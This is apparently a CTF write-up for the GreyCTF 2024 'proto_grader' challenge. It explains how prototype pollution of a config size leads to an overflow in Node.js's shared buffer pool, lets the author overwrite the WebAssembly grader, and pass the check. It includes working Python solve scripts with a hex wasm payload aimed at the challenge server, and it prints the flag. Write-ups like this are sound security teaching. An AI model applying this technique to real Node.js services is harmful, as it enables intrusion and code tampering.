# Overview

The web page is a simple flag checker with a single input field:

![screenshot](/grey24/proto_grader.png)

Looking in the source code, here is the flag checking route in flask:

```python:main.py
@app.route("/grade", methods=["POST"])
def receive_grade():
    data = request.get_json()
    data = json.dumps(data).encode()

    try:
        out = subprocess.check_output(
            [
                "node",
                os.path.join(cur_dir, "../backend/index.js"),
                base64.b64encode(data),
            ]
        ).decode()
        if int(out) < 3:
            print("solve", data)
            return json.load(open(os.path.join(cur_dir, "../config.json")))["flag"]
        else:
            print(out)
            return "Wrong answer!"
    except Exception:
        return "Process crashed or didn't return an integer"
```

So the flag checking logic is in node. Here is index.js:

```javascript:index.js
...
const code = fs.readFileSync(__dirname + "/grader/grader.wasm");
...

const src = JSON.parse(atob(process.argv[2]));

const dst = {};
util.copy(src, dst);

const input = dst["input"];

if (!input) {
    console.log("???");
} else {
    console.log(grader(code, input, flag));
}
```

and the grader function is as follows:

```javascript:grader/index.js
...

module.exports = (code, input, flag) => {
  for (let i = 0; i < flag.length; i++) {
    buf[i + 100] = flag.charCodeAt(i);
  }

  let input_len = 0;
  while (input_len < 100 && input[input_len] != 0) {
    buf[input_len] = input[input_len];
    input_len++;
  }

  const module = new WebAssembly.Module(code);
  return new WebAssembly.Instance(module, imports).exports.levenshtein(input_len, flag.length);
}
```

So the `grader` function takes in WebAssembly (wasm) bytecode and runs the `levenshtein` function within it. It also loads the `input` and `flag` strings into wasm virtual memory at offsets 0 and 100 respectively.

Fortunately, we do not need to reverse the wasm as its source is provided in typescript under `assembly/assembly/index.ts`. The first line says `// Modified from https://github.com/kyranet/levenshtein-wasm/blob/main/assembly/index.ts`, so I downloaded the file from that url and diffed it with the challenge `index.ts`. There were no notable changes to the function logic, so it's safe to assume that the `levenshtein` function does indeed calculate the levenshtein distance between the 2 input strings. (Levenshtein distance is a metric measuring the difference between 2 strings, specifically the number of single-character edits required to transform one string to the other.)

# How I debugged stuff

When testing payloads, I ran `node index.js $(echo '{"input":"4141"}' | base64 -w 0)` inside the `backend` folder and added a bunch of `console.log` statements in the javascript where necessary. When I needed a specific string value I just encoded the string in python (`b'testing'.hex()`) and copied the result.

# Prototype pollution

So far there doesn't seem to be any obvious vulnerability that could get us the flag. However, I noticed the (very conspicuous) prototype pollution vulnerability in the `util.copy` function. Consider the code in index.js:

```javascript:index.js
const src = JSON.parse(atob(process.argv[2]));

const dst = {};
util.copy(src, dst);

const input = dst["input"];
```

Here we control `process.argv[2]`. The program allows us to specify a json object, which is then copied to `dst` via `util.copy`:

```javascript:util.js
module.exports.copy = function copy(src, dst) {
    for (const key of Object.keys(src)) {
        const val = src[key];
        if (is_object(val)) {
            copy(src[key], dst[key]);
        } else if (typeof val == "string") {
            dst[key] = decode_user_hex_string(src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}
```

This is of course a suspiciously large amount of functionality to essentially just get a single input string. We can pass in the JSON `{"__proto__": {"anyKey": "anyValue"}}` to achieve prototype pollution. But what do we pollute? I couldn't find any useful target property. I considered the possibility of there being some flag or config option in some WebAssembly object or something, but I couldn't find one. I was stuck here for quite a while until I remembered `config.size` from the `decode_user_hex_string` function:

```javascript:util.js
const config = require("../config.json");

function decode_user_hex_string(str) {
    const length = config.size;

    const buf = new Uint8Array(Buffer.from("a".repeat(length)).buffer);

    for (let i = 0; i < length * 2; i += 2) {
        const byte = parseInt(str.substring(i, i + 2), 16);
        if (Number.isNaN(byte)) {
            buf[i >>> 1] = 0;
        }
        buf[i >>> 1] = byte;
    }
    return buf;
}
```

This function is called by `util.copy`. In config.json, we have 

```json:config.json
{
    "flag":"grey{fake_flag_for_testing}",
    "length": 32
}
```

There is no property named `size` (originally I assumed this was a typo and renamed `.size` to `.length` when running the code), so we can use our prototype pollution gadget to control this.

But I couldn't figure out how this could be useful and was stuck again. At this point, since I was stonewalled on all the challenges I took a ~1.5 hour nap. After arising from my slumber I still felt very tired (many such cases), and it was around 2h to the end of the CTF so I felt pretty much finished mentally.

# Node.js buffers

When printing the `Uint8Array` returned by `decode_user_hex_string`, it was unexpectedly 8192 bytes in size:

```plaintext
Uint8Array(8192) [
   47,   0,   0,   0,   0,   0,   0,   0,  47,   0,   0,   0,
    0,   0,   0,   0,  99, 111, 110, 115, 116,  32, 102, 115,
   32,  61,  32, 114, 101, 113, 117, 105, 114, 101,  40,  39,
  102, 115,  39,  41,  59,  10,  99, 111, 110, 115, 116,  32,
   99, 111, 100, 101,  32,  61,  32, 102, 115,  46, 114, 101,
   97, 100,  70, 105, 108, 101,  83, 121, 110,  99,  40,  95,
   95, 100, 105, 114, 110,  97, 109, 101,  32,  43,  32,  39,
   47, 103, 114,  97, 100, 101, 114,  47, 103, 114,  97, 100,
  101, 114,  46, 119,
  ... 8092 more items
]
```

I decided to investigate this unexpected behavior by printing the full 8192 bytes:

```javascript:util.js
function decode_user_hex_string(str) {
  ...

  const string = new TextDecoder().decode(buf);
  console.log(string);
  return buf;
}
```

Running `node index.js $(echo '{"__proto__":{"size":4},"input":"41414141"}' | base64)` produces the output:

```plaintext
AAAA/const fs = require('fs');
const code = fs.readFileSync(__dirname + '/grader/grader.wasm');

const util = require('./util.js');
const grader = require('./grader');
const flag = util.config.flag;

const src = JSON.parse(atob(process.argv[2]));

const dst = {};
util.copy(src, dst);

const input = dst['input'];

if (!input) {
  console.log('???');
} else {
  console.log(grader(code, input, flag));
}
asm`envmemory
             levenshteinmemory
��@  Ak- -cFA
             @ Ak! Ak!


                      @  K - -dFA
                                 @ Aj!


                                        k"E  k"AIr@ 
                                                    A!@  AtI@ At Aj"6� Aj"Aj! At  j-6� !


 Aj" j-d!                                                                                AtAk!@  AkI@  "j-d!
          Aj j-d!
                  Aj" j-d!
 Fj"!A!@  I@ AjAt(�!  J!         !! At(�" H " Hr Aj Aj  Jj 
          Jr Aj Aj  Hj 
                        F
                          Jr AjAj Hj 
                                      F
                                       r Aj Aj  Jj 
 F
  � ! Aj!





         @  I@  "j-d! Aj"!A!@  I@ AjAt(�! At"(�" H  Jr Aj Aj  Jj  F
                                                                   � ! Aj!





                                                                           
                                                                           const config = require('../config.json');

function decode_user_hex_string(str) {
  const length = config.size;

  const buf = new Uint8Array(Buffer.from('a'.repeat(length)).buffer);

  for (let i = 0; i < length * 2; i += 2) {
    const byte = parseInt(str.substring(i, i + 2), 16);
    if (Number.isNaN(byte)) {
      buf[i >>> 1] = 0;
    }
    buf[i >>> 1] = byte;
  }

  const string = new TextDecoder().decode(buf);
  console.log(string);
  return buf;
}

function is_object(t) {
  return typeof t == 'object' && t !== null && !Array.isArray(t);
}

module.exports.copy = function copy(src, dst) {
  for (const key of Object.keys(src)) {
    const val = src[key];
    if (is_object(val)) {
      copy(src[key], dst[key]);
    } else if (typeof val == 'string') {
      dst[key] = decode_user_hex_string(src[key]);
    } else {
      dst[key] = src[key];
    }
  }
};

module.exports.config = config;
{
    "flag":"grey{fake_flag_for_testing}",
    "length": 32
}const memory = new WebAssembly.Memory({ initial: 1 });
const imports = {
  env: {
    memory: memory,
  },
};

const buf = new Uint8Array(memory.buffer);


module.exports = (code, input, flag) => {
  for (let i = 0; i < flag.length; i++) {
    buf[i + 100] = flag.charCodeAt(i);
  }

  let input_len = 0;
  while (input_len < 100 && input[input_len] != 0) {
    buf[input_len] = input[input_len];
    input_len++;
  }

  const module = new WebAssembly.Module(code);
  return new WebAssembly.Instance(module, imports).exports.levenshtein(input_len, flag.length);
}{"__proto__":{"size":4},"input":"41414141"}
aaaa
```

I was rather perplexed to find all the source code in this buffer. Furthermore, our payload is at the start of the buffer.

I tried sending a very long payload to see if overwriting anything was possible: `node index.js $(echo '{"__proto__":{"size":100},"input":"41414141 ... 41"}' | base64 -w 0)`

```plaintext
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAasm');

const util = require('./util.js');
const grader = require('./grader');
...
```

So we can overwrite stuff, but evidently, modifying the JS code in this buffer doesn't affect program execution. I'm not sure how or why these buffers of JS code were created, or what they are used for. But I'm guessing it doesn't affect program execution because JS is a JIT-compiled language and the bytecode for those lines have already been compiled anyway and are somewhere else in memory.

I tried sending an even longer input, this time from a python script:

```python:t.py

import subprocess
import base64

s = '41'*2000

out = subprocess.check_output(
    [
        "node",
        'backend/index.js',
        base64.b64encode(
            ("{'__proto__':{'size': 2000},'input':'" + s + "'}").replace("'", '"').encode()),
    ]
).decode()

print(out)
```

This time I get an error:

```plaintext
CompileError: WebAssembly.Module(): expected magic word 00 61 73 6d, found 41 41 41 41 @+0
    at module.exports (/home/smalldonkey/ctf/grey24f/dist-proto_grader/backend/grader/index.js:22:18)
    at Object.<anonymous> (/home/smalldonkey/ctf/grey24f/dist-proto_grader/backend/index.js:18:15)
    at Module._compile (node:internal/modules/cjs/loader:1198:14)
    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1252:10)
    at Module.load (node:internal/modules/cjs/loader:1076:32)
    at Function.Module._load (node:internal/modules/cjs/loader:911:12)
    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
    at node:internal/main/run_main_module:22:47
```

# Overwriting wasm

Somehow, we have overwritten WebAssembly code. In retrospect this makes sense because if you take another look at the buffer printed above, the WebAssembly code can be seen slightly after the `index.js` JS code.

Note: while I was solving this part of the challenge I didn't fully understand what was going on and mainly relied on my intuition. I assumed that the 'magic word' indicated the start of the wasm code, so perhaps this means we can overwrite the wasm?

But first, we have to find the exact offset in the buffer where the wasm starts. I did this using binary search and arrived found that it was 416. Modifying the line in `t.py`: `s = '41'*416 + '42424242'` and running it gave the error: 

```plaintext
CompileError: WebAssembly.Module(): expected magic word 00 61 73 6d, found 42 42 42 42 @+0
    at module.exports (/home/smalldonkey/ctf/grey24f/dist-proto_grader/backend/grader/index.js:22:18)
    at Object.<anonymous> (/home/smalldonkey/ctf/grey24f/dist-proto_grader/backend/index.js:18:15)
    at Module._compile (node:internal/modules/cjs/loader:1198:14)
    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1252:10)
    at Module.load (node:internal/modules/cjs/loader:1076:32)
    at Function.Module._load (node:internal/modules/cjs/loader:911:12)
    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
    at node:internal/main/run_main_module:22:47
```

So now we are sure we can control the wasm code at this offset. If we write wasm code that outputs a number less than 3 it would satisfy the check in the python flask server (see above), and print the flag.

I modified the typescript code in `assembly/assembly/index.ts`:

```typescript:index.ts
export function levenshtein(input_len: u32, flag_len: u32): u32 {
  return 0;
}
```

Then I compiled it with `npm run asbuild`, and the resulting bytecode can be found in `build/release.wasm`. I wrote another script to read the file into hex encoded format:

```python:h.py
with open('release.wasm', 'rb') as f:
    data = f.read()
    print(data.hex())
```

I then copied the output into `t.py` and ran it. However, we now get a different error:

```plaintext
CompileError: WebAssembly.Module(): expected string length @+74
    at module.exports (/home/smalldonkey/ctf/grey24f/dist-proto_grader/backend/grader/index.js:22:18)
    at Object.<anonymous> (/home/smalldonkey/ctf/grey24f/dist-proto_grader/backend/index.js:18:15)
    at Module._compile (node:internal/modules/cjs/loader:1198:14)
    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1252:10)
    at Module.load (node:internal/modules/cjs/loader:1076:32)
    at Function.Module._load (node:internal/modules/cjs/loader:911:12)
    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
    at node:internal/main/run_main_module:22:47
```

I didn't know what was causing this, so I tried adding extra bytes after the bytecode but that also didn't work. For sanity I replaced my bytecode with the bytecode in `grader.wasm` and ran `t.py` again. This time it ran without errors, so I knew that the problem lay in my bytecode.

I tried a bunch of stuff unsuccessfully, then my teammate @hal0g3n suggested that maybe the error was because the length of the bytecode needed to remain the same. We tried just changing the last line of the function to `return 1;`, but for some reason the resulting bytecode was shorter (maybe because of optimization removing unused variables?). Then he got the idea of changing the `===` check at the start to `!==`, as shown:

```typescript:index.ts
export function levenshtein(input_len: u32, flag_len: u32): u32 {
  // Perform suffix suffix trimming
  while (input_len > 0 && (charCodeAt(input, input_len - 1) !== charCodeAt(flag, flag_len - 1))) {
    --input_len;
    --flag_len;
  }

  // Perform prefix trimming
  let offset: u32 = 0;
  while (offset < input_len && (charCodeAt(input, offset) !== charCodeAt(flag, offset))) {
    ++offset;
  }

  ...
}
```

Compiling the wasm, we found that the size of the bytecode matches that of `grader.wasm`. Copying the bytecode to `t.py` and running it, we get the output: `-73`.

This satisfies the `< 3` check! I quickly wrote up a solve script:

```python:s.py
import requests

s = '41'*416 + '0061736d0100000001070160027f7f017f020f0103656e76066d656d6f7279020000030201000718020b6c6576656e73687465696e0000066d656d6f727902000a9e05019b0501117f03402000047f200041016b2d000020012d0063470541000b0440200041016b2100200141016b21010c010b0b0340200020124b047f20122d000020122d0064470541000b0440201241016a21120c010b0b200020126b220345200120126b220f410349720440200f0f0b417f21110340200720034101744904402007410274200441016a22003602c801200741016a220141016a21072001410274200420126a2d00003602c801200021040c010b0b200341017441016b210e03402002200f41036b4904402012200222006a2d0064210d200041016a220720126a2d0064210c200041026a220820126a2d0064210b200041036a220120126a2d0064210a200041046a220221114100210403402004200e490440200441016a4102742802c8012110200120114a21092001210620082105200441027422082802c80122032000482007220120004872047f200741016a200341016a200320074a1b052000200041016a200d2010461b0b210720082009200120054a200120074a72047f200541016a200741016a20052007481b052001200141016a200c2010461b0b2208200548200520064a72047f200641016a200841016a20062008481b052005200541016a200b2010461b0b220120064872047f201141016a200141016a200120114a1b052006200641016a200a2010461b0b22113602c80120032100200441026a21040c010b0b0c010b0b03402002200f4904402012200222006a2d00642106200041016a220221114100210403402004200e490440200441016a4102742802c8012105200441027422032802c8012201200048200020114a72047f201141016a200141016a200120114a1b052000200041016a20052006461b0b2111200320113602c80120012100200441026a21040c010b0b0c010b0b20110b'

resp = requests.post('http://localhost:33337/grade',
                      json={'__proto__': {'size': 2000}, 'input': s})
print(resp.text)
```

Testing this locally, we get the flag!

I changed the url to the remote challenge server and ran the script again. Unfortunately, it returns `Process crashed or didn't return an integer`.

After doing some thinking, I guessed that it was because the remote server had a different offset for the wasm code. I modified the solve script to test a range of values:

```python:s.py
import requests

for i in range(416-20, 416+20):
    s = '41'*i + '0061736d0100000001070160027f7f017f020f0103656e76066d656d6f7279020000030201000718020b6c6576656e73687465696e0000066d656d6f727902000a9e05019b0501117f03402000047f200041016b2d000020012d0063470541000b0440200041016b2100200141016b21010c010b0b0340200020124b047f20122d000020122d0064470541000b0440201241016a21120c010b0b200020126b220345200120126b220f410349720440200f0f0b417f21110340200720034101744904402007410274200441016a22003602c801200741016a220141016a21072001410274200420126a2d00003602c801200021040c010b0b200341017441016b210e03402002200f41036b4904402012200222006a2d0064210d200041016a220720126a2d0064210c200041026a220820126a2d0064210b200041036a220120126a2d0064210a200041046a220221114100210403402004200e490440200441016a4102742802c8012110200120114a21092001210620082105200441027422082802c80122032000482007220120004872047f200741016a200341016a200320074a1b052000200041016a200d2010461b0b210720082009200120054a200120074a72047f200541016a200741016a20052007481b052001200141016a200c2010461b0b2208200548200520064a72047f200641016a200841016a20062008481b052005200541016a200b2010461b0b220120064872047f201141016a200141016a200120114a1b052006200641016a200a2010461b0b22113602c80120032100200441026a21040c010b0b0c010b0b03402002200f4904402012200222006a2d00642106200041016a220221114100210403402004200e490440200441016a4102742802c8012105200441027422032802c8012201200048200020114a72047f201141016a200141016a200120114a1b052000200041016a20052006461b0b2111200320113602c80120012100200441026a21040c010b0b0c010b0b20110b'

    resp = requests.post('http://challs.nusgreyhats.org:33337/grade',
                         json={'__proto__': {'size': 2000}, 'input': s})
    if not resp.text.startswith('Process crashed'):
        print(resp.text)
```

I ran this and to my surprise, the flag was printed!

```plaintext
grey{n0d3j5_3v3ry7h1n6_p0llu710n}
```

We solved this challenge around 30 minutes before the end of the CTF, clinching first place by a very narrow margin of 29 points. That was pretty cool.

![GreyCTF 2024 scoreboard](/grey24/scoreboard.jpg)

# Understanding the buffer overflow

After the CTF, I did some further research in order to understand the exploit better.

Firstly, it seems that nodejs is allocating buffers from a larger 'shared' buffer. Consider the offending line of code:

```javascript
const buf = new Uint8Array(Buffer.from('a'.repeat(length)).buffer);
```

Here the key thing to understand is that `buf` is in fact _not_ the buffer of `aaaa`s. This is because the `.buffer` property actually points to the 'parent' ArrayBuffer, which nodejs allocates smaller buffers from. (Initially, I mistakenly assumed that `.buffer` just converted it to a different data type or something)

This is why, if you refer back to the full printed buffer above, you can see the `aaaa` all the way at the end, while the decoded string is written to the start of the big ArrayBuffer.

`ArrayBuffer` is the most fundamental data type to store binary data in javascript, providing a fixed-size chunk of memory. It is implemented in v8. On the other hand, `Buffer` is implemented in nodejs using `Uint8Array` and provides more functionality. We can find the implementation of `Buffer.from` in [https://github.com/nodejs/node/blob/main/lib/buffer.js#L295](https://github.com/nodejs/node/blob/main/lib/buffer.js#L295)

```javascript:buffer.js
Buffer.from = function from(value, encodingOrOffset, length) {
  if (typeof value === 'string')
    return fromString(value, encodingOrOffset);
  
  ...
};
```

In the context of our challenge, `value` is a string, so we follow the `fromString` function:

```javascript:buffer.js
function fromString(string, encoding) {
  let ops;
  if (typeof encoding !== 'string' || encoding.length === 0) {
    if (string.length === 0)
      return new FastBuffer();
    ops = encodingOps.utf8;
  } else {
    ops = getEncodingOps(encoding);
    if (ops === undefined)
      throw new ERR_UNKNOWN_ENCODING(encoding);
    if (string.length === 0)
      return new FastBuffer();
  }
  return fromStringFast(string, ops);
}
```

Then we follow `fromStringFast`:

```javascript
function fromStringFast(string, ops) {
  const length = ops.byteLength(string);

  if (length >= (Buffer.poolSize >>> 1))
    return createFromString(string, ops.encodingVal);

  if (length > (poolSize - poolOffset))
    createPool();
  let b = new FastBuffer(allocPool, poolOffset, length);
  const actual = ops.write(b, string, 0, length);
  if (actual !== length) {
    // byteLength() may overestimate. That's a rare case, though.
    b = new FastBuffer(allocPool, poolOffset, actual);
  }
  poolOffset += actual;
  alignPool();
  return b;
}
```

As expected, there is some sort of a `pool` that nodejs allocates from. Also, `Buffer.poolSize` is 8192, explaining why our buffer is of that size. `allocPool` is a global variable, presumably the big ArrayBuffer that contained all our source code, wasm code and other buffers.

For completeness `FastBuffer` is simply a subclass of `Uint8array`:

```javascript:buffer.js
class FastBuffer extends Uint8Array {
  // Using an explicit constructor here is necessary to avoid relying on
  // `Array.prototype[Symbol.iterator]`, which can be mutated by users.
  // eslint-disable-next-line no-useless-constructor
  constructor(bufferOrLength, byteOffset, length) {
    super(bufferOrLength, byteOffset, length);
  }
}
```

Overall, this was a very interesting challenge that gave me a better understanding of nodejs.